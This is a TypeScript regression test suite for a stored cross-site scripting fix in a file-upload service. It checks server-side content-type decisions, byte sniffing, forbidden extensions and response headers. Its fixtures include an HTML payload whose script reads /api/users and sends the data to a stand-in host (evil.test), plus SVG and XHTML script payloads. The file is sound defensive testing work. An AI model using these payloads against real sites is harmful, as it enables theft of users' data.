/**
 * Regression tests for the content of uploaded files.
 *
 * The vulnerability these tests exist for: the `Content-Type` an uploaded file
 * was served with came from the CLIENT. `POST /api/uploads` stored
 * `file.type` and `GET /api/files/<id>` served that column back. A client
 * could therefore upload a file named `photo.png`, declare
 * `Content-Type: text/html`, and have the application's own origin serve the
 * uploaded bytes as an HTML document — a stored cross-site scripting hole in
 * the authenticated origin.
 *
 * These tests are about the DECISION, not about the transport: they check
 * that the server decides what a file is from a server-controlled allow-list
 * and the file's own bytes, and that the content type it will serve is never
 * one a browser can execute.
 *
 * Each assertion fails against the pre-fix behaviour.
 */

import assert from "assert";
import fs from "fs";
import path from "path";
import {
  FORBIDDEN_EXTENSIONS,
  INLINE_SAFE_CATEGORIES,
  SCRIPTABLE_CONTENT_TYPES,
  FILE_RESPONSE_CSP,
  UPLOAD_CONTENT_RULES,
  looksLikeMarkup,
  ruleForExtension,
  servedContentTypeFor,
  verifyUploadContent,
} from "@/lib/upload-content";

const REPO_ROOT = path.join(__dirname, "..");

/** Reads a file from the repository. */
function read(relative: string): string {
  return fs.readFileSync(path.join(REPO_ROOT, relative), "utf8");
}

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void | Promise<void>) {
  return Promise.resolve()
    .then(fn)
    .then(() => {
      console.log(`✅ PASS: ${name}`);
      passed++;
    })
    .catch((error: unknown) => {
      console.error(`❌ FAIL: ${name}`);
      console.error(`   ${error instanceof Error ? error.message : String(error)}`);
      failed++;
    });
}

/* ── Fixtures: minimal but genuine file headers ─────────────────────────────── */

const PNG_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
const JPEG_BYTES = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
const GIF_BYTES = Buffer.from("GIF89a....", "latin1");
const WEBP_BYTES = Buffer.concat([
  Buffer.from("RIFF", "latin1"),
  Buffer.from([0x1a, 0x00, 0x00, 0x00]),
  Buffer.from("WEBP", "latin1"),
]);
const BMP_BYTES = Buffer.from("BM......", "latin1");
const PDF_BYTES = Buffer.from("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n", "latin1");
const ZIP_BYTES = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]);
const RTF_BYTES = Buffer.from("{\\rtf1\\ansi Hello}", "latin1");
const MP4_BYTES = Buffer.concat([
  Buffer.from([0x00, 0x00, 0x00, 0x18]),
  Buffer.from("ftypisom", "latin1"),
]);
const WEBM_BYTES = Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0x01, 0x02]);
const MP3_BYTES = Buffer.from("ID3\x03\x00\x00\x00", "latin1");
const WAV_BYTES = Buffer.concat([
  Buffer.from("RIFF", "latin1"),
  Buffer.from([0x24, 0x00, 0x00, 0x00]),
  Buffer.from("WAVEfmt ", "latin1"),
]);
const OGG_BYTES = Buffer.from("OggS....", "latin1");
const FLAC_BYTES = Buffer.from("fLaC....", "latin1");
const AAC_BYTES = Buffer.from([0xff, 0xf1, 0x50, 0x80]);
const AVI_BYTES = Buffer.concat([
  Buffer.from("RIFF", "latin1"),
  Buffer.from([0x00, 0x00, 0x00, 0x00]),
  Buffer.from("AVI LIST", "latin1"),
]);

/** The payload an attacker uploads: an HTML document with a script. */
const HTML_PAYLOAD = Buffer.from(
  `<!DOCTYPE html><html><body><script>fetch('/api/users').then(r=>r.text()).then(t=>new Image().src='https://evil.test/?'+encodeURIComponent(t))</script></body></html>`,
  "latin1"
);

/** An SVG that carries script. */
const SVG_PAYLOAD = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`,
  "latin1"
);

/** An XML prologue followed by SVG — the XHTML/SVG shape. */
const XHTML_PAYLOAD = Buffer.from(
  `<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)"></svg>`,
  "latin1"
);

async function main() {
  console.log("🗂️  Running uploaded-content regression tests\n");

  // ── The core of the fix: the served content type is server-controlled ───────
  await test("Every served content type is decided by the server, not the client", () => {
    for (const [extension, rule] of Object.entries(UPLOAD_CONTENT_RULES)) {
      assert.ok(rule.contentType, `${extension} must have a server-determined content type`);
      assert.ok(
        !SCRIPTABLE_CONTENT_TYPES.has(rule.contentType.split(";")[0].trim()),
        `${extension} must not be served with the scriptable type ${rule.contentType}`
      );
      assert.ok(
        !rule.contentType.toLowerCase().includes("html"),
        `${extension} must not be served with an HTML type`
      );
      assert.ok(
        !rule.contentType.toLowerCase().includes("svg"),
        `${extension} must not be served with an SVG type`
      );
    }
  });

  await test("The file response policy sandboxes the response", () => {
    assert.ok(
      FILE_RESPONSE_CSP.includes("sandbox"),
      `the file policy must sandbox the response: ${FILE_RESPONSE_CSP}`
    );
    assert.ok(
      FILE_RESPONSE_CSP.includes("default-src 'none'"),
      `the file policy must block every subresource: ${FILE_RESPONSE_CSP}`
    );
    assert.ok(
      FILE_RESPONSE_CSP.includes("frame-ancestors 'none'"),
      `the file policy must forbid framing: ${FILE_RESPONSE_CSP}`
    );
  });

  await test("A client that declares text/html is refused whatever the extension is", () => {
    for (const name of ["evil.png", "evil.jpg", "evil.pdf", "evil.txt", "evil.mp4", "evil.zip"]) {
      const verdict = verifyUploadContent(name, PNG_BYTES, "text/html");
      assert.ok(!verdict.ok, `${name} declared as text/html must be refused`);
    }
  });

  await test("A client that declares image/svg+xml is refused", () => {
    const verdict = verifyUploadContent("evil.png", PNG_BYTES, "image/svg+xml");
    assert.ok(!verdict.ok, "an SVG-declared upload must be refused");
  });

  await test("A client that declares a scriptable type is refused even with matching bytes", () => {
    const verdict = verifyUploadContent("photo.png", PNG_BYTES, "application/xhtml+xml");
    assert.ok(!verdict.ok, "a scriptable declared type must be refused");
  });

  // ── Extension spoofing: the bytes must match the extension ─────────────────
  await test("An HTML payload uploaded as a .png is refused", () => {
    const verdict = verifyUploadContent("evil.png", HTML_PAYLOAD, "image/png");
    assert.ok(!verdict.ok, "HTML bytes in a .png must be refused");
  });

  await test("An HTML payload uploaded as a .jpg is refused", () => {
    const verdict = verifyUploadContent("evil.jpg", HTML_PAYLOAD, "image/jpeg");
    assert.ok(!verdict.ok, "HTML bytes in a .jpg must be refused");
  });

  await test("An SVG payload uploaded as a .png is refused", () => {
    const verdict = verifyUploadContent("evil.png", SVG_PAYLOAD, "image/png");
    assert.ok(!verdict.ok, "SVG bytes in a .png must be refused");
  });

  await test("An XHTML payload uploaded as a .gif is refused", () => {
    const verdict = verifyUploadContent("evil.gif", XHTML_PAYLOAD, "image/gif");
    assert.ok(!verdict.ok, "XHTML bytes in a .gif must be refused");
  });

  await test("An HTML payload uploaded as a .txt is refused", () => {
    const verdict = verifyUploadContent("evil.txt", HTML_PAYLOAD, "text/plain");
    assert.ok(!verdict.ok, "HTML bytes in a .txt must be refused");
  });

  await test("Bytes that do not match the extension are refused", () => {
    const verdict = verifyUploadContent("not-really.png", Buffer.from("just some text"), "image/png");
    assert.ok(!verdict.ok, "a .png that is not a PNG must be refused");
  });

  await test("A ZIP renamed to .png is refused", () => {
    const verdict = verifyUploadContent("archive.png", ZIP_BYTES, "image/png");
    assert.ok(!verdict.ok, "a ZIP renamed to .png must be refused");
  });

  await test("A PNG renamed to .pdf is refused", () => {
    const verdict = verifyUploadContent("photo.pdf", PNG_BYTES, "application/pdf");
    assert.ok(!verdict.ok, "a PNG renamed to .pdf must be refused");
  });

  // ── Forbidden extensions ───────────────────────────────────────────────────
  await test("HTML, SVG and XHTML extensions are refused outright", () => {
    for (const extension of ["html", "htm", "xhtml", "svg", "svgz", "xht", "mhtml", "shtml"]) {
      assert.ok(
        ruleForExtension(extension) === null,
        `.${extension} must not be on the allow-list`
      );
      const verdict = verifyUploadContent(`page.${extension}`, HTML_PAYLOAD, "text/html");
      assert.ok(!verdict.ok, `.${extension} must be refused`);
    }
  });

  await test("The forbidden extension list covers the document formats", () => {
    for (const extension of ["html", "htm", "xhtml", "svg", "xml", "js"]) {
      assert.ok(FORBIDDEN_EXTENSIONS.has(extension), `${extension} must be forbidden`);
    }
  });

  await test("An unknown extension is refused", () => {
    const verdict = verifyUploadContent("thing.exe", PNG_BYTES, "application/octet-stream");
    assert.ok(!verdict.ok, "an unknown extension must be refused");
  });

  await test("A file with no extension at all is refused", () => {
    const verdict = verifyUploadContent("README", PNG_BYTES, "image/png");
    assert.ok(!verdict.ok, "a file with no extension must be refused");
  });

  // ── Legitimate uploads must keep working ───────────────────────────────────
  await test("Legitimate uploads are accepted and get the server's content type", () => {
    const cases: Array<[string, Buffer, string]> = [
      ["photo.png", PNG_BYTES, "image/png"],
      ["photo.jpg", JPEG_BYTES, "image/jpeg"],
      ["photo.jpeg", JPEG_BYTES, "image/jpeg"],
      ["anim.gif", GIF_BYTES, "image/gif"],
      ["photo.webp", WEBP_BYTES, "image/webp"],
      ["photo.bmp", BMP_BYTES, "image/bmp"],
      ["paper.pdf", PDF_BYTES, "application/pdf"],
      ["notes.txt", Buffer.from("Just some notes.\n", "latin1"), "text/plain; charset=utf-8"],
      ["letter.rtf", RTF_BYTES, "application/rtf"],
      ["archive.zip", ZIP_BYTES, "application/zip"],
      ["report.docx", ZIP_BYTES, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"],
      ["clip.mp4", MP4_BYTES, "video/mp4"],
      ["clip.webm", WEBM_BYTES, "video/webm"],
      ["song.mp3", MP3_BYTES, "audio/mpeg"],
      ["song.wav", WAV_BYTES, "audio/wav"],
      ["song.ogg", OGG_BYTES, "audio/ogg"],
      ["song.flac", FLAC_BYTES, "audio/flac"],
      ["song.aac", AAC_BYTES, "audio/aac"],
      ["clip.avi", AVI_BYTES, "video/x-msvideo"],
    ];
    for (const [name, bytes, expectedType] of cases) {
      const verdict = verifyUploadContent(name, bytes, undefined);
      assert.ok(verdict.ok, `${name} must be accepted (${verdict.reason ?? ""})`);
      assert.strictEqual(verdict.contentType, expectedType, `${name} content type`);
    }
  });

  await test("A legitimate file is accepted even when the client declares no type", () => {
    const verdict = verifyUploadContent("photo.png", PNG_BYTES, undefined);
    assert.ok(verdict.ok, "a PNG with no declared type must be accepted");
  });

  await test("A legitimate file is accepted when the client declares a harmless type", () => {
    // The declared type is NOT used to decide what is served, so a browser
    // that reports `application/octet-stream` for a ZIP must still work.
    const verdict = verifyUploadContent("archive.zip", ZIP_BYTES, "application/octet-stream");
    assert.ok(verdict.ok, "a ZIP declared as octet-stream must be accepted");
    assert.strictEqual(verdict.contentType, "application/zip");
  });

  await test("A plain-text assignment that mentions <script> is accepted", () => {
    // The markup check looks for document markers, not for the word "script",
    // so a code sample in a text file is not refused. It is served as
    // text/plain with a download disposition, where it cannot execute.
    const verdict = verifyUploadContent(
      "answer.txt",
      Buffer.from("function x() { /* <script> */ return 1; }", "latin1"),
      "text/plain"
    );
    assert.ok(verdict.ok, "a text file mentioning <script> must be accepted");
  });

  // ── The markup detector itself ─────────────────────────────────────────────
  await test("The markup detector recognises HTML, SVG and XHTML", () => {
    assert.ok(looksLikeMarkup(HTML_PAYLOAD), "HTML must be detected");
    assert.ok(looksLikeMarkup(SVG_PAYLOAD), "SVG must be detected");
    assert.ok(looksLikeMarkup(XHTML_PAYLOAD), "XHTML must be detected");
    assert.ok(looksLikeMarkup(Buffer.from("   <!DOCTYPE html>", "latin1")), "leading space is handled");
    assert.ok(
      looksLikeMarkup(Buffer.from([0xef, 0xbb, 0xbf, 0x3c, 0x68, 0x74, 0x6d, 0x6c])),
      "a UTF-8 BOM before the markup is handled"
    );
  });

  await test("The markup detector does not flag ordinary content", () => {
    assert.ok(!looksLikeMarkup(PNG_BYTES), "a PNG must not be flagged");
    assert.ok(!looksLikeMarkup(Buffer.from("hello world")), "plain text must not be flagged");
    assert.ok(
      !looksLikeMarkup(Buffer.from("const s = '<script>';")),
      "a code sample must not be flagged"
    );
  });

  // ── What the serve route does with the stored name ─────────────────────────
  await test("A stored file is served with the server's content type", () => {
    const served = servedContentTypeFor("3f2b1c4d-0000-4000-8000-000000000000.png");
    assert.strictEqual(served.contentType, "image/png");
    assert.strictEqual(served.category, "image");
    assert.strictEqual(served.inline, true);
  });

  await test("An object-storage key is served with the server's content type", () => {
    const served = servedContentTypeFor("uploads/submission/3f2b1c4d-0000-4000-8000-000000000000.mp4");
    assert.strictEqual(served.contentType, "video/mp4");
    assert.strictEqual(served.inline, true);
  });

  await test("A document is never served inline", () => {
    const served = servedContentTypeFor("3f2b1c4d-0000-4000-8000-000000000000.pdf");
    assert.strictEqual(served.contentType, "application/pdf");
    assert.strictEqual(served.inline, false);
  });

  await test("An archive is never served inline", () => {
    const served = servedContentTypeFor("3f2b1c4d-0000-4000-8000-000000000000.zip");
    assert.strictEqual(served.inline, false);
  });

  await test("A file with an extension that is not on the allow-list is served as a download", () => {
    // This is the legacy-file case: rows uploaded before the fix, or whose
    // stored name is not on the allow-list, must never be rendered inline and
    // must never be given a scriptable type.
    const served = servedContentTypeFor("3f2b1c4d-0000-4000-8000-000000000000.html");
    assert.strictEqual(served.contentType, "application/octet-stream");
    assert.strictEqual(served.inline, false);
  });

  await test("Only images, video and audio may be served inline", () => {
    for (const rule of Object.values(UPLOAD_CONTENT_RULES)) {
      const expected = INLINE_SAFE_CATEGORIES.has(rule.category);
      const served = servedContentTypeFor(`x.${Object.entries(UPLOAD_CONTENT_RULES).find(
        ([, value]) => value === rule
      )![0]}`);
      assert.strictEqual(served.inline, expected, `${rule.contentType} inline`);
    }
  });

  await test("No allow-listed extension is ever served inline as a document", () => {
    for (const [extension, rule] of Object.entries(UPLOAD_CONTENT_RULES)) {
      const served = servedContentTypeFor(`x.${extension}`);
      if (served.inline) {
        assert.ok(
          rule.category === "image" || rule.category === "video" || rule.category === "audio",
          `${extension} is inline but is not a media type`
        );
      }
    }
  });

  // ── The routes must actually USE the policy ────────────────────────────────
  // A policy that nothing calls is not a fix. These assertions pin the two
  // places where the decision is made, so a future change cannot quietly go
  // back to serving the client's declared type.
  await test("The upload route stores the server's content type, not the client's", () => {
    const source = read("src/app/api/uploads/route.ts");
    assert.ok(
      !/mimeType:\s*\(?\s*file\.type/.test(source),
      "the upload route must not store the client-declared MIME type"
    );
    assert.ok(
      source.includes("verifyUploadContent"),
      "the upload route must verify the file's content"
    );
    assert.ok(
      /mimeType:\s*verdict\.contentType/.test(source),
      "the upload route must store the content type the server derived"
    );
  });

  await test("The file route serves the server-determined type, not the stored column", () => {
    const source = read("src/app/api/files/[id]/route.ts");
    assert.ok(
      !/row\.mimeType/.test(source),
      "the file route must not serve the stored mime_type column"
    );
    assert.ok(
      source.includes("servedContentTypeFor"),
      "the file route must derive the content type from the server allow-list"
    );
    /* The headers that are actually sent with the FILE are asserted, not the
       whole file: the route also sets headers on the object-storage redirect,
       so a whole-file search would pass even if the served response had
       lost them. */
    const baseHeadersAt = source.indexOf("const baseHeaders");
    assert.ok(baseHeadersAt > 0, "the file route must build the served headers");
    const baseHeaders = source.slice(baseHeadersAt, baseHeadersAt + 900);
    assert.ok(
      baseHeaders.includes("X-Content-Type-Options"),
      "the served file response must send nosniff"
    );
    assert.ok(
      baseHeaders.includes("nosniff"),
      "the served file response must send nosniff"
    );
    assert.ok(
      baseHeaders.includes("Content-Security-Policy"),
      "the served file response must send a Content-Security-Policy"
    );
    assert.ok(
      baseHeaders.includes("FILE_RESPONSE_CSP"),
      "the served file response must send the shared file policy"
    );
    assert.ok(
      baseHeaders.includes("Cross-Origin-Resource-Policy"),
      "the served file response must forbid cross-origin embedding"
    );
  });

  await test("The presign route binds the server's content type into the signed PUT", () => {
    const source = read("src/app/api/uploads/presign/route.ts");
    assert.ok(
      !/presignedUploadUrl\(config, key, mimeType/.test(source),
      "the presigned PUT must not be bound to the client-declared MIME type"
    );
    assert.ok(
      /presignedUploadUrl\(config, key, contentType\)/.test(source),
      "the presigned PUT must be bound to the server's content type"
    );
    /* The binding above is only as good as where `contentType` comes from:
       it must be the allow-list's type, never the client's declaration. */
    assert.ok(
      /const contentType = rule\.contentType;/.test(source),
      "the content type bound into the signed PUT must be the allow-list's"
    );
    assert.ok(
      !/const contentType = mimeType/.test(source),
      "the content type bound into the signed PUT must not come from the client"
    );
  });

  await test("The global policy does not serve uploaded files as documents", () => {
    const source = read("next.config.ts");
    assert.ok(
      source.includes("/api/files/:path*"),
      "the file responses must have their own policy rule"
    );
    assert.ok(
      source.includes("FILE_RESPONSE_CSP"),
      "the file responses must use the shared file policy"
    );
  });

  console.log(`\n📊 Results: ${passed} passed, ${failed} failed`);
  if (failed > 0) process.exitCode = 1;
  else console.log(`✅ ${passed} uploaded-content tests passed`);
}

main().catch((error: unknown) => {
  console.error("Uploaded-content suite failed to run:", error);
  process.exitCode = 1;
});
